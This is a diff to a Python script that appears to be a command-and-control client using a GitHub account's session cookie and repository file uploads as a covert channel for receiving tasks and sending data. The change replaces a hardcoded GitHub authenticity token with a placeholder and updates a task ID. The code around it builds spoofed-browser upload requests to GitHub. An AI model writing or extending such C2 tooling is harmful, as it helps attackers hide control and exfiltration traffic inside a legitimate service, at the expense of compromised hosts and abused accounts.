@@ -16,7 +16,8 @@ C2_GITHUB_ACCOUNT_COOKIE = 'YOUR_GITHUB_COOKIE'
 C2_CLIENT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
 PROXY_HOST = '127.0.0.1'
 PROXY_PORT = 8080
-FIRST_TASK_ID = 15111010 ### TAKE IT FROM THE server.ini File and the value of first_command
+AUTHENTICITY_TOKEN = 'YOUR_AUTHENTICITY_TOKEN'
+FIRST_TASK_ID = 15111785 ### TAKE IT FROM THE server.ini File and the value of first_command
 
 def fetchRepoHtml(host, path):
 
@@ -122,7 +123,7 @@ def getUploadPolicy(repository_id, size):
         f"application/x-zip-compressed\r\n"
         f"--{boundary}\r\n"
         f"Content-Disposition: form-data; name=\"authenticity_token\"\r\n\r\n"
-        f"X68OrMZhOvStKX_fi-f8AmvDfTjyyVoQ1rIwxEwcqtuo39W8gcwTtpTb0yQMvG1jQEkQBOwrE-wY5I7Jb-MOQQ\r\n"
+        f"{AUTHENTICITY_TOKEN}\r\n"
         f"--{boundary}\r\n"
         f"Content-Disposition: form-data; name=\"repository_id\"\r\n\r\n"
         f"{repository_id}\r\n"
